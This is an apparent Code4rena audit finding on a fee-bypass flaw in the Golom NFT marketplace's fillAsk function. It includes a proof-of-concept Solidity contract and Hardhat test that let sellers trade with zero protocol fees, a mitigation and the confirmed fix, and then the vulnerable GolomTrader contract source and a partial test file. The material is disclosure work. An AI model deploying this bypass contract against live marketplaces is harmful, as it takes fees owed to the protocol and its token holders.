{
  "Title": "[H-08]  Users can avoid paying fees while trading trustlessly & using Golom's network effects",
  "Content": "\n*   If a maker makes below mentioned `AvoidsFeesContract` a [reservedAddress](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L220) and hides the info about how much they want their NFT in [order.root](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L58), they can avoid paying fees while trading trustlessly and using the nework effects of golom maketplace with 0 [o.totalAmt](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L52). See POC to get a better idea.\n*   Here the maker uses order.root to hide the amount they want to get paid because it is much cleaner for a POC.\n    *   But since golom does not have an API where user can submit a signature without using the frontend, they will use something like deadline to hide the amount they want to get paid.\n    *   Reason they would use deadline is because that is something they can control in the golom NFT frontend\n    *   They can pack the information about deadline and amount they want to get paid, in one uint256 as a deadline and then the check in the contract would look a different\n\n### Proof of Concept\n\n*   Clone the [repo](https://github.com/code-423n4/2022-07-golom) and run `yarn`\n*   Create a `AvoidsFeesContract.sol` contract in `contracts/test/` folder with following code\n\n```\n//contract that avoids paying fees everytime\n\npragma solidity 0.8.11;\n\nimport \"../core/GolomTrader.sol\";\n\n//A maker will be gurranteed a payout if it makes this contract the reservedAddress and hide the payment info about how much they want in Oder.root\n//Users will use this every time to trade to avoid paying fees\n//They use the networking effects of the golom marketplace without paying the fees\ncontract AvoidsFeesContract {\n    GolomTrader public immutable golomTrader;\n\n    constructor(GolomTrader _golomTrader) {\n        golomTrader = _golomTrader;\n    }\n\n    function fillAsk(\n        GolomTrader.Order calldata o,\n        uint256 amount,\n        address referrer,\n        GolomTrader.Payment calldata p,\n        address receiver\n    ) public payable {\n        require(\n            o.reservedAddress == address(this),\n            \"not allowed if signer has not reserved this contract\"\n        ); //the signer will only allow this contract to execute the trade and since it has following checks, they will be guranteed a payout they want without paying the fees\n        require(\n            p.paymentAddress == o.signer,\n            \"signer needs to be the payment address\"\n        );\n        //I am using root as an example because it is much cleaner for a POC.\n        //but since golom does not have an API where user can submit a signature without using the frontend, they will use something like deadline to hide the amount they want to get paid.\n        //Reason they would use deadline is because that is something they can control in the golom NFT frontend\n        //They can pack the information about deadline and amount they want to get paid, in one uint256 as a deadline and then the check below would look a little different\n        require(\n            p.paymentAmt == uint256(o.root),\n            \"you need to pay what signer wants\"\n        ); //the maker will hide the payment info in oder.root\n\n        golomTrader.fillAsk{value: msg.value}(\n            o,\n            amount,\n            referrer,\n            p,\n            receiver = msg.sender\n        );\n    }\n}\n\n```\n\n*   Add following test in `test/GolomTrader.specs.ts` [here](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L390).\n*   Also, add `const AvoidsFeesContractArtifacts = ethers.getContractFactory('AvoidsFeesContract');` after [this](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L14) line and `import { AvoidsFeesContract as AvoidsFeesContractTypes } from '../typechain/AvoidsFeesContract';` after [this](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L28) line.\n*   Run `npx hardhat compile && npx hardhat test`\n\n```\n       it.only('should allow malicious contract to execute the trade while bypassing the fees', async () => {\n            //deploy the malicious contract\n            const avoidsFeesContract: AvoidsFeesContractTypes = (await (await AvoidsFeesContractArtifacts).deploy(golomTrader.address)) as AvoidsFeesContractTypes;\n\n            //here the frontend calculates exchangeAmount and prePaymentAmt as a percentage of how much the make wants to receive for their NFT. \n            //as far as the frontend is concerned, the maker inputs 0 for their NFT value which in turn makes the exchangeAmount and prePaymentAmt 0 \n            let exchangeAmount = ethers.utils.parseEther('0'); // nothing to the exchange\n            let prePaymentAmt = ethers.utils.parseEther('0'); // no royalty cut\n            let totalAmt = ethers.utils.parseEther('0');\n            let tokenId = await testErc721.current();\n\n            let nftValueThatMakerWants = ethers.utils.parseEther('10.25');\n\n            const order = {\n                collection: testErc721.address,\n                tokenId: tokenId,\n                signer: await maker.getAddress(),\n                orderType: 0,\n                totalAmt: totalAmt,\n                exchange: { paymentAmt: exchangeAmount, paymentAddress: await exchange.getAddress() },\n                prePayment: { paymentAmt: prePaymentAmt, paymentAddress: await prepay.getAddress() },\n                isERC721: true,\n                tokenAmt: 1,\n                refererrAmt: 0,\n                root: ethers.utils.hexZeroPad(nftValueThatMakerWants.toHexString(), 32), //convert Bignumber to bytes32\n                reservedAddress: avoidsFeesContract.address,\n                nonce: 0,\n                deadline: Date.now() + 100000,\n                r: '',\n                s: '',\n                v: 0,\n            };\n\n            let signature = (await maker._signTypedData(domain, types, order)).substring(2); //a valid signature as far as your frontend goes\n\n            order.r = '0x' + signature.substring(0, 64);\n            order.s = '0x' + signature.substring(64, 128);\n            order.v = parseInt(signature.substring(128, 130), 16);\n\n            let makerBalanceBefore = await ethers.provider.getBalance(await maker.getAddress());\n\n            await avoidsFeesContract.connect(taker).fillAsk(\n                order,\n                1,\n                '0x0000000000000000000000000000000000000000',\n                {\n                    paymentAmt: nftValueThatMakerWants,\n                    paymentAddress: order.signer,\n                },\n                receiver,\n                {\n                    value: nftValueThatMakerWants,\n                }\n            );\n\n            let makerBalanceAfter = await ethers.provider.getBalance(await maker.getAddress());\n\n            expect(await testErc721.balanceOf(await taker.getAddress())).to.be.equals('1');\n            expect(makerBalanceAfter.sub(makerBalanceBefore)).to.be.equals(nftValueThatMakerWants);//maker is guaranteed a payout\n\n        });\n\n```\n\n### Tools Used\n\n*   The [repo](https://github.com/code-423n4/2022-07-golom) itself. (hardhat)\n\n### Recommended Mitigation Steps\n\n*   Make sure that o.totalAmt is greater than p.paymentAmt in addition to [this](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L217) check\n\n**[0xsaruman (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/33)**\n\n**[0xsaruman (Golom) resolved and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/33#issuecomment-1214216268):**\n > Circumvented by putting this line in the code\n> \n> `require(o.totalAmt * amount * 15/100 >= p.paymentAmt, 'can only pay 15% extra');`\n\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-07-golom-contest",
  "Code": [
    {
      "filename": "contracts/core/GolomTrader.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.11;\n\nimport '@openzeppelin/contracts/access/Ownable.sol';\nimport '@openzeppelin/contracts/security/ReentrancyGuard.sol';\n\ninterface ERC721 {\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n}\n\ninterface ERC1155 {\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 id,\n        uint256 amount,\n        bytes calldata data\n    ) external;\n}\n\ninterface ERC20 {\n    function transferFrom(\n        address src,\n        address dst,\n        uint256 wad\n    ) external returns (bool);\n\n    function withdraw(uint256 wad) external;\n}\n\ninterface Distributor {\n    function addFee(address[2] calldata addr, uint256 fee) external;\n}\n\ncontract GolomTrader is Ownable, ReentrancyGuard {\n    bytes32 public immutable EIP712_DOMAIN_TYPEHASH;\n    mapping(address => uint256) public nonces; // all nonces other then this nonce\n    mapping(bytes32 => uint256) public filled;\n\n    ERC20 WETH = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n\n    struct Order {\n        address collection; // NFT contract address\n        uint256 tokenId; // order for which tokenId of the collection\n        address signer; // maker of order address\n        uint256 orderType; // 0 if selling nft for eth , 1 if offering weth for nft,2 if offering weth for collection with special criteria root\n        uint256 totalAmt; // price value of the trade // total amt maker is willing to give up per unit of amount\n        Payment exchange; // payment agreed by maker of the order to pay on succesful filling of trade this amt is subtracted from totalamt\n        Payment prePayment; // another payment , can be used for royalty, facilating trades\n        bool isERC721; // standard of the collection , if 721 then true , if 1155 then false\n        uint256 tokenAmt; // token amt useful if standard is 1155 if >1 means whole order can be filled tokenAmt times\n        uint256 refererrAmt; // amt to pay to the address that helps in filling your order\n        bytes32 root; // A merkle root derived from each valid tokenId â€” set to 0 to indicate a collection-level or tokenId-specific order.\n        address reservedAddress; // if not address(0) , only this address can fill the order\n        uint256 nonce; // nonce of order usefull for cancelling in bulk\n        uint256 deadline; // timestamp till order is valid epoch timestamp in secs\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n    }\n\n    struct Payment {\n        uint256 paymentAmt;\n        address paymentAddress;\n    }\n\n    address public governance;\n\n    Distributor public distributor;\n    address public pendingDistributor;\n    uint256 public distributorEnableDate;\n\n    // events\n    event NonceIncremented(address indexed maker, uint256 newNonce);\n\n    event OrderFilled(\n        address indexed maker,\n        address indexed taker,\n        uint256 indexed orderType,\n        bytes32 orderHash,\n        uint256 price\n    );\n\n    event OrderCancelled(bytes32 indexed orderHash);\n\n    /// @param _governance Address of the governance, responsible for setting distributor\n    constructor(address _governance) {\n        // sets governance as owner\n        _transferOwnership(_governance);\n\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n\n        EIP712_DOMAIN_TYPEHASH = keccak256(\n            abi.encode(\n                keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n                keccak256(bytes('GOLOM.IO')),\n                keccak256(bytes('1')),\n                chainId,\n                address(this)\n            )\n        );\n    }\n\n    function hashPayment(Payment calldata p) private pure returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256('payment(uint256 paymentAmt,address paymentAddress)'),\n                    p.paymentAmt,\n                    p.paymentAddress\n                )\n            );\n    }\n\n    function _hashOrder(Order calldata o) private pure returns (bytes32) {\n        return _hashOrderinternal(o, [o.nonce, o.deadline]);\n    }\n\n    function _hashOrderinternal(Order calldata o, uint256[2] memory extra) private pure returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256(\n                        'order(address collection,uint256 tokenId,address signer,uint256 orderType,uint256 totalAmt,payment exchange,payment prePayment,bool isERC721,uint256 tokenAmt,uint256 refererrAmt,bytes32 root,address reservedAddress,uint256 nonce,uint256 deadline)payment(uint256 paymentAmt,address paymentAddress)'\n                    ),\n                    o.collection,\n                    o.tokenId,\n                    o.signer,\n                    o.orderType,\n                    o.totalAmt,\n                    hashPayment(o.exchange),\n                    hashPayment(o.prePayment),\n                    o.isERC721,\n                    o.tokenAmt,\n                    o.refererrAmt,\n                    o.root,\n                    o.reservedAddress,\n                    extra\n                )\n            );\n    }\n\n    function payEther(uint256 payAmt, address payAddress) internal {\n        if (payAmt > 0) {\n            // if royalty has to be paid\n            payable(payAddress).transfer(payAmt); // royalty transfer to royaltyaddress\n        }\n    }\n\n    /// @dev Validates Order and returns OrderStatus, hashedorder, amountRemaining to be filled\n    ///      OrderStatus = 0 , if signature is invalid\n    ///      OrderStatus = 1 , if deadline has been\n    ///      OrderStatus = 2 , order is filled or cancelled\n    ///      OrderStatus = 3 , valid order\n    /// @param o the Order struct to be validated\n    function validateOrder(Order calldata o)\n        public\n        view\n        returns (\n            uint256,\n            bytes32,\n            uint256\n        )\n    {\n        // match signature\n        bytes32 hashStruct = _hashOrder(o);\n        bytes32 hash = keccak256(abi.encodePacked('\\x19\\x01', EIP712_DOMAIN_TYPEHASH, hashStruct));\n        address signaturesigner = ecrecover(hash, o.v, o.r, o.s);\n        require(signaturesigner == o.signer, 'invalid signature');\n        if (signaturesigner != o.signer) {\n            return (0, hashStruct, 0);\n        }\n        //deadline\n        if (block.timestamp > o.deadline) {\n            return (1, hashStruct, 0);\n        }\n        // not cancelled by nonce or by hash\n        if (o.nonce != nonces[o.signer]) {\n            return (2, hashStruct, 0);\n        }\n        if (filled[hashStruct] >= o.tokenAmt) {\n            // handles erc1155\n            return (2, hashStruct, 0);\n        }\n        return (3, hashStruct, o.tokenAmt - filled[hashStruct]);\n    }\n\n    /// @dev function to fill a signed order of ordertype 0, also has a payment param in case the taker wants\n    ///      to send ether to that address on filling the order\n    /// @param o the Order struct to be filled must be orderType 0\n    /// @param amount the amount of times the order is to be filled(useful for ERC1155)\n    /// @param referrer referrer of the order\n    /// @param p any extra payment that the taker of this order wanna send on succesful execution of order\n    /// @param receiver address which will receive the NFT\n    function fillAsk(\n        Order calldata o,\n        uint256 amount,\n        address referrer,\n        Payment calldata p,\n        address receiver\n    ) public payable nonReentrant {\n        // check if the signed total amount has all the amounts as well as 50 basis points fee\n        require(\n            o.totalAmt >= o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt + (o.totalAmt * 50) / 10000,\n            'amt not matching'\n        );\n\n        // attached ETH value should be greater than total value of one NFT * total number of NFTs + any extra payment to be given\n        require(msg.value >= o.totalAmt * amount + p.paymentAmt, 'mgmtm');\n\n        if (o.reservedAddress != address(0)) {\n            require(msg.sender == o.reservedAddress);\n        }\n        require(o.orderType == 0, 'invalid orderType');\n\n        (uint256 status, bytes32 hashStruct, uint256 amountRemaining) = validateOrder(o);\n\n        require(status == 3, 'order not valid');\n        require(amountRemaining >= amount, 'order already filled');\n\n        filled[hashStruct] = filled[hashStruct] + amount;\n\n        if (receiver == address(0)) {\n            receiver = msg.sender;\n        }\n        if (o.isERC721) {\n            require(amount == 1, 'only 1 erc721 at 1 time');\n            ERC721(o.collection).transferFrom(o.signer, receiver, o.tokenId);\n        } else {\n            ERC1155(o.collection).safeTransferFrom(o.signer, receiver, o.tokenId, amount, '');\n        }\n\n        // pay fees of 50 basis points to the distributor\n        payEther(((o.totalAmt * 50) / 10000) * amount, address(distributor));\n\n        // pay the exchange share\n        payEther(o.exchange.paymentAmt * amount, o.exchange.paymentAddress);\n\n        // pay the pre payment\n        payEther(o.prePayment.paymentAmt * amount, o.prePayment.paymentAddress);\n\n        if (o.refererrAmt > 0 && referrer != address(0)) {\n            payEther(o.refererrAmt * amount, referrer);\n            payEther(\n                (o.totalAmt -\n                    (o.totalAmt * 50) /\n                    10000 -\n                    o.exchange.paymentAmt -\n                    o.prePayment.paymentAmt -\n                    o.refererrAmt) * amount,\n                o.signer\n            );\n        } else {\n            payEther(\n                (o.totalAmt - (o.totalAmt * 50) / 10000 - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount,\n                o.signer\n            );\n        }\n        payEther(p.paymentAmt, p.paymentAddress);\n\n        distributor.addFee([o.signer, o.exchange.paymentAddress], ((o.totalAmt * 50) / 10000) * amount);\n        emit OrderFilled(o.signer, msg.sender, 0, hashStruct, o.totalAmt * amount);\n    }\n\n    /// @dev function to fill a signed order of ordertype 1 also has a payment param in case the taker wants\n    ///      to send ether to that address on filling the order\n    /// @param o the Order struct to be filled must be orderType 1\n    /// @param amount the amount of times the order is to be filled(useful for ERC1155)\n    /// @param referrer referrer of the order\n    /// @param p any extra payment that the taker of this order wanna send on succesful execution of order\n    function fillBid(\n        Order calldata o,\n        uint256 amount,\n        address referrer,\n        Payment calldata p\n    ) public nonReentrant {\n        require(\n            o.totalAmt * amount >\n                (o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt) * amount + p.paymentAmt\n        ); // cause bidder eth is paying for seller payment p , dont take anything extra from seller\n        // require eth amt is sufficient\n        if (o.reservedAddress != address(0)) {\n            require(msg.sender == o.reservedAddress);\n        }\n        require(o.orderType == 1);\n        (uint256 status, bytes32 hashStruct, uint256 amountRemaining) = validateOrder(o);\n        require(status == 3);\n        require(amountRemaining >= amount);\n        filled[hashStruct] = filled[hashStruct] + amount;\n        if (o.isERC721) {\n            require(amount == 1, 'only 1 erc721 at 1 time');\n            ERC721 nftcontract = ERC721(o.collection);\n            nftcontract.transferFrom(msg.sender, o.signer, o.tokenId);\n        } else {\n            ERC1155 nftcontract = ERC1155(o.collection);\n            nftcontract.safeTransferFrom(msg.sender, o.signer, o.tokenId, amount, '');\n        }\n        emit OrderFilled(msg.sender, o.signer, 1, hashStruct, o.totalAmt * amount);\n        _settleBalances(o, amount, referrer, p);\n    }\n\n    // cancel by nonce and by individual order\n\n    function cancelOrder(Order calldata o) public nonReentrant {\n        require(o.signer == msg.sender);\n        (, bytes32 hashStruct, ) = validateOrder(o);\n        filled[hashStruct] = o.tokenAmt + 1;\n        emit OrderCancelled(hashStruct);\n    }\n\n    /**\n     * Increment a particular maker's nonce, thereby invalidating all orders that were not signed\n     * with the original nonce.\n     */\n    function incrementNonce() external nonReentrant {\n        uint256 newNonce = ++nonces[msg.sender];\n        emit NonceIncremented(msg.sender, newNonce);\n    }\n\n    /// @dev function to fill a signed order of ordertype 2 also has a payment param in case the taker wants\n    ///      to send ether to that address on filling the order, Match an criteria order, ensuring that the supplied proof demonstrates inclusion of the tokenId in the associated merkle root, if root is 0 then any token can be used to fill the order\n    /// @param o the Order struct to be filled must be orderType 2\n    /// @param amount the amount of times the order is to be filled(useful for ERC1155)\n    /// @param referrer referrer of the order\n    /// @param p any extra payment that the taker of this order wanna send on succesful execution of order\n    function fillCriteriaBid(\n        Order calldata o,\n        uint256 amount,\n        uint256 tokenId,\n        bytes32[] calldata proof,\n        address referrer,\n        Payment calldata p\n    ) public nonReentrant {\n        require(o.totalAmt >= o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt);\n        // require eth amt is sufficient\n        if (o.reservedAddress != address(0)) {\n            require(msg.sender == o.reservedAddress);\n        }\n        require(o.orderType == 2);\n        (uint256 status, bytes32 hashStruct, uint256 amountRemaining) = validateOrder(o);\n        require(status == 3);\n        require(amountRemaining >= amount);\n\n        filled[hashStruct] = filled[hashStruct] + amount;\n        // Proof verification is performed when there's a non-zero root.\n        if (o.root != bytes32(0)) {\n            _verifyProof(tokenId, o.root, proof);\n        }\n\n        if (o.isERC721) {\n            require(amount == 1, 'only 1 erc721 at 1 time');\n            ERC721 nftcontract = ERC721(o.collection);\n            nftcontract.transferFrom(msg.sender, o.signer, tokenId);\n        } else {\n            ERC1155 nftcontract = ERC1155(o.collection);\n            nftcontract.safeTransferFrom(msg.sender, o.signer, tokenId, amount, '');\n        }\n        emit OrderFilled(msg.sender, o.signer, 2, hashStruct, o.totalAmt * amount);\n        _settleBalances(o, amount, referrer, p);\n    }\n\n    /// @dev function to settle balances when a bid is filled succesfully\n    /// @param o the Order struct to be filled must be orderType 1\n    /// @param amount the amount of times the order is to be filled(useful for ERC1155)\n    /// @param referrer referrer of the order\n    /// @param p any extra payment that the taker of this order wanna send on succesful execution of order\n    function _settleBalances(\n        Order calldata o,\n        uint256 amount,\n        address referrer,\n        Payment calldata p\n    ) internal {\n        uint256 protocolfee = ((o.totalAmt * 50) / 10000) * amount;\n        WETH.transferFrom(o.signer, address(this), o.totalAmt * amount);\n        WETH.withdraw(o.totalAmt * amount);\n        payEther(protocolfee, address(distributor));\n        payEther(o.exchange.paymentAmt * amount, o.exchange.paymentAddress);\n        payEther(o.prePayment.paymentAmt * amount, o.prePayment.paymentAddress);\n        if (o.refererrAmt > 0 && referrer != address(0)) {\n            payEther(o.refererrAmt * amount, referrer);\n            payEther(\n                (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt - o.refererrAmt) *\n                    amount -\n                    p.paymentAmt,\n                msg.sender\n            );\n        } else {\n            payEther(\n                (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt,\n                msg.sender\n            );\n        }\n        payEther(p.paymentAmt, p.paymentAddress);\n        distributor.addFee([msg.sender, o.exchange.paymentAddress], protocolfee);\n    }\n\n    /// @dev Ensure that a given tokenId is contained within a supplied merkle root using a supplied proof.\n    /// @param leaf The tokenId.\n    /// @param root A merkle root derived from each valid tokenId.\n    /// @param proof A proof that the supplied tokenId is contained within the associated merkle root.\n    function _verifyProof(\n        uint256 leaf,\n        bytes32 root,\n        bytes32[] memory proof\n    ) public pure {\n        bytes32 computedHash = keccak256(abi.encode(leaf));\n        for (uint256 i = 0; i < proof.length; i++) {\n            bytes32 proofElement = proof[i];\n            if (computedHash <= proofElement) {\n                // Hash(current computed hash + current element of the proof)\n                computedHash = _efficientHash(computedHash, proofElement);\n            } else {\n                // Hash(current element of the proof + current computed hash)\n                computedHash = _efficientHash(proofElement, computedHash);\n            }\n        }\n        if (computedHash != root) {\n            revert('invalid proof');\n        }\n    }\n\n    /// @dev Efficiently hash two bytes32 elements using memory scratch space.\n    /// @param a The first element included in the hash.\n    /// @param b The second element included in the hash.\n    /// @return value The resultant hash of the two bytes32 elements.\n    function _efficientHash(bytes32 a, bytes32 b) private pure returns (bytes32 value) {\n        assembly {\n            mstore(0x00, a)\n            mstore(0x20, b)\n            value := keccak256(0x00, 0x40)\n        }\n    }\n\n    /// @notice Sets the distributor contract\n    /// @param _distributor Address of the distributor\n    function setDistributor(address _distributor) external onlyOwner {\n        if (address(distributor) == address(0)) {\n            distributor = Distributor(_distributor);\n        } else {\n            pendingDistributor = _distributor;\n            distributorEnableDate = block.timestamp + 1 days;\n        }\n    }\n\n    /// @notice Executes the set distributor function after the timelock\n    function executeSetDistributor() external onlyOwner {\n        require(distributorEnableDate <= block.timestamp, 'not allowed');\n        distributor = Distributor(pendingDistributor);\n    }\n\n    fallback() external payable {}\n\n    receive() external payable {}\n}"
    },
    {
      "filename": "test/GolomTrader.specs.ts",
      "content": "// for all order types test\n// if cancel by order is working and only the creater can cancel nobody else can cancel\n// if cancel by nonce is working and only the creater can cancel nobody else can cancel\n// fill by amount is working, multiple address can fill, upto the specified amount and not more then that\n// orders with reserved address set, only the reserved address can fill those orders\n// for criteria orders test if tokenids that match criteria only can fill and of the specified collections can fill\n\nimport { ethers, waffle } from 'hardhat';\nimport { BigNumber, utils, Signer, constants } from 'ethers';\nimport chai from 'chai';\nconst { expect } = chai;\n\n// import artifacts\nconst GolomTraderArtifacts = ethers.getContractFactory('GolomTrader');\nconst RewardDistributorArtifacts = ethers.getContractFactory('RewardDistributor');\nconst VoteEscrowArtifacts = ethers.getContractFactory('VoteEscrow');\n\nconst ERC721MockArtifacts = ethers.getContractFactory('ERC721Mock');\nconst ERC1155MockArtifacts = ethers.getContractFactory('ERC1155Mock');\nconst ERC20MockArtifacts = ethers.getContractFactory('ERC20Mock');\nconst WETHArtifacts = ethers.getContractFactory('WETH');\nconst GolomTokenArtifacts = ethers.getContractFactory('GolomToken');\n\n\n// import typings\nimport { GolomToken as GolomTokenTypes } from '../typechain/GolomToken';\n\nimport { GolomTrader as GolomTraderTypes } from '../typechain/GolomTrader';\nimport { RewardDistributor as RewardDistributorTypes } from '../typechain/RewardDistributor';\nimport { VoteEscrow as VoteEscrowTypes } from '../typechain/VoteEscrow';\nimport { WETH as WETHTypes } from '../typechain/WETH';\n\nimport { ERC721Mock as ERC721MockTypes } from '../typechain/ERC721Mock';\nimport { ERC1155Mock as ERC1155MockTypes } from '../typechain/ERC1155Mock';\nimport { ERC20Mock as ERC20MockTypes } from '../typechain/ERC20Mock';\n\nlet testErc20: ERC20MockTypes;\nlet testErc721: ERC721MockTypes;\nlet testErc1155: ERC1155MockTypes;\nlet weth: WETHTypes;\nlet golomToken: GolomTokenTypes;\n\nlet golomTrader: GolomTraderTypes;\n// let voteEscrow: VoteEscrowTypes;\nlet rewardDistributor: RewardDistributorTypes;\n\nlet accounts: Signer[];\nlet governance: Signer;\nlet maker: any;\nlet taker: any;\nlet exchange: any;\nlet prepay: any;\nlet postpay: any;\nlet receiver: \"0x0000000000000000000000000000000000000000\";\nlet domain: any;\n\nconst types = {\n    payment: [\n        { name: 'paymentAmt', type: 'uint256' },\n        { name: 'paymentAddress', type: 'address' },\n    ],\n    order: [\n        { name: 'collection', type: 'address' },\n        { name: 'tokenId', type: 'uint256' },\n        { name: 'signer', type: 'address' },\n        { name: 'orderType', type: 'uint256' },\n        { name: 'totalAmt', type: 'uint256' },\n        { name: 'exchange', type: 'payment' },\n        { name: 'prePayment', type: 'payment' },\n        { name: 'isERC721', type: 'bool' },\n        { name: 'tokenAmt', type: 'uint256' },\n        { name: 'refererrAmt', type: 'uint256' },\n        { name: 'root', type: 'bytes32' },\n        { name: 'reservedAddress', type: 'address' },\n        { name: 'nonce', type: 'uint256' },\n        { name: 'deadline', type: 'uint256' },\n    ],\n};\n\ndescribe('Trader.sol', function () {\n    beforeEach(async function () {\n        accounts = await ethers.getSigners();\n        maker = accounts[0];\n        taker = accounts[1];\n        exchange = accounts[2];\n        prepay = accounts[3];\n        postpay = accounts[4];\n        governance = accounts[5];\n        receiver = \"0x0000000000000000000000000000000000000000\";\n\n        testErc20 = (await (await ERC20MockArtifacts).deploy()) as ERC20MockTypes;\n        testErc721 = (await (await ERC721MockArtifacts).deploy()) as ERC721MockTypes;\n        testErc1155 = (await (await ERC1155MockArtifacts).deploy()) as ERC1155MockTypes;\n        weth = (await (await WETHArtifacts).deploy()) as WETHTypes;\n        golomToken = (await (await GolomTokenArtifacts).deploy(await accounts[0].getAddress())) as GolomTokenTypes;\n        // deploy trader contract\n        golomTrader = (await (await GolomTraderArtifacts).deploy(await governance.getAddress())) as GolomTraderTypes;\n        rewardDistributor = (await (\n            await RewardDistributorArtifacts\n        ).deploy(\n            weth.address,\n            golomTrader.address,\n            golomToken.address,\n            await governance.getAddress()\n        )) as RewardDistributorTypes;\n\n        domain = {\n            name: 'GOLOM.IO',\n            version: '1',\n            chainId: 31337,\n            verifyingContract: golomTrader.address,\n        };\n\n        // set distributor\n        await golomTrader.connect(governance).setDistributor(rewardDistributor.address);\n        // await golomTrader.connect(governance).executeSetDistributor();\n\n        await testErc721.mint(await maker.getAddress());\n        await testErc721.connect(maker).setApprovalForAll(golomTrader.address, true);\n        await testErc1155.connect(maker).setApprovalForAll(golomTrader.address, true);\n    });\n\n    describe('#constructor', () => {\n        it('should set governance', async () => {\n            console.log(await golomTrader.owner())\n            expect(await golomTrader.owner()).to.be.equals(await governance.getAddress());\n        });\n    });\n\n    describe('#fillAsk', () => {\n        it('should revert if signed total amount is less than values', async () => {\n            let exchangeAmount = ethers.utils.parseEther('1'); // cut for the exchanges\n            let prePaymentAmt = ethers.utils.parseEther('0.25'); // royalty cut\n            let totalAmt = ethers.utils.parseEther('1');\n            let tokenId = await testErc721.current();\n\n            const order = {\n                collection: testErc721.address,\n                tokenId: tokenId,\n                signer: await maker.getAddress(),\n                orderType: 0,\n                totalAmt: totalAmt,\n                exchange: { paymentAmt: exchangeAmount, paymentAddress: await exchange.getAddress() },\n                prePayment: { paymentAmt: prePaymentAmt, paymentAddress: await prepay.getAddress() },\n                isERC721: true,\n                tokenAmt: 1,\n                refererrAmt: 0,\n                root: '0x0000000000000000000000000000000000000000000000000000000000000000',\n                reservedAddress: constants.AddressZero,\n                nonce: 0,\n                deadline: Date.now() + 100000,\n                r: '',\n                s: '',\n                v: 0,\n            };\n\n\n            let signature = (await maker._signTypedData(domain, types, order)).substring(2);\n\n            order.r = '0x' + signature.substring(0, 64);\n            order.s = '0x' + signature.substring(64, 128);\n            order.v = parseInt(signature.substring(128, 130), 16);\n\n    \n            await expect(\n                golomTrader.connect(taker).fillAsk(\n                    order,\n                    1,\n                    '0x0000000000000000000000000000000000000000',\n                    {\n                        paymentAmt: prePaymentAmt,\n                        paymentAddress: await governance.getAddress(),\n                    },\n                    receiver,\n                    {\n                        value: utils.parseEther('15'),\n                    }\n                )\n            ).to.be.revertedWith('amt not matching');\n        });\n\n        it('should revert if msg.value is less than signed amounts', async () => {\n            let exchangeAmount = ethers.utils.parseEther('1'); // cut for the exchanges\n            let prePaymentAmt = ethers.utils.parseEther('0.25'); // royalty cut\n            let totalAmt = ethers.utils.parseEther('10');\n            let tokenId = await testErc721.current();\n\n            const order = {\n                collection: testErc721.address,\n                tokenId: tokenId,\n                signer: await maker.getAddress(),\n                orderType: 0,\n                totalAmt: totalAmt,\n                exchange: { paymentAmt: exchangeAmount, paymentAddress: await exchange.getAddress() },\n                prePayment: { paymentAmt: prePaymentAmt, paymentAddress: await prepay.getAddress() },\n                isERC721: true,\n                tokenAmt: 1,\n                refererrAmt: 0,\n                root: '0x0000000000000000000000000000000000000000000000000000000000000000',\n                reservedAddress: constants.AddressZero,\n                nonce: 0,\n                deadline: Date.now() + 100000,\n                r: '',\n                s: '',\n                v: 0,\n            };\n\n            let signature = (await maker._signTypedData(domain, types, order)).substring(2);\n\n            order.r = '0x' + signature.substring(0, 64);\n            order.s = '0x' + signature.substring(64, 128);\n            order.v = parseInt(signature.substring(128, 130), 16);\n\n            await expect(\n                golomTrader.connect(taker).fillAsk(\n                    order,\n                    1,\n                    '0x0000000000000000000000000000000000000000',\n                    {\n                        paymentAmt: prePaymentAmt,\n                        paymentAddress: await governance.getAddress(),\n                    },\n                    receiver,\n                    {\n                        value: utils.parseEther('10'),\n                    }\n                )\n            ).to.be.revertedWith('mgmtm');\n        });\n\n        it('should revert if orderType is not 0', async () => {\n            let exchangeAmount = ethers.utils.parseEther('1'); // cut for the exchanges\n            let prePaymentAmt = ethers.utils.parseEther('0.25'); // royalty cut\n            let totalAmt = ethers.utils.parseEther('10');\n            let tokenId = await testErc721.current();\n\n            const order = {\n                collection: testErc721.address,\n                tokenId: tokenId,\n                signer: await maker.getAddress(),\n                orderType: 1,\n                totalAmt: totalAmt,\n                exchange: { paymentAmt: exchangeAmount, paymentAddress: await exchange.getAddress() },\n                prePayment: { paymentAmt: prePaymentAmt, paymentAddress: await prepay.getAddress() },\n                isERC721: true,\n                tokenAmt: 1,\n                refererrAmt: 0,\n                root: '0x0000000000000000000000000000000000000000000000000000000000000000',\n                reservedAddress: constants.AddressZero,\n                nonce: 0,\n                deadline: Date.now() + 100000,\n                r: '',\n                s: '',\n                v: 0,\n            };\n\n            let signature = (await maker._signTypedData(domain, types, order)).substring(2);\n\n            order.r = '0x' + signature.substring(0, 64);\n            order.s = '0x' + signature.substring(64, 128);\n            order.v = parseInt(signature.substring(128, 130), 16);\n\n            await expect(\n                golomTrader.connect(taker).fillAsk(\n                    order,\n                    1,\n                    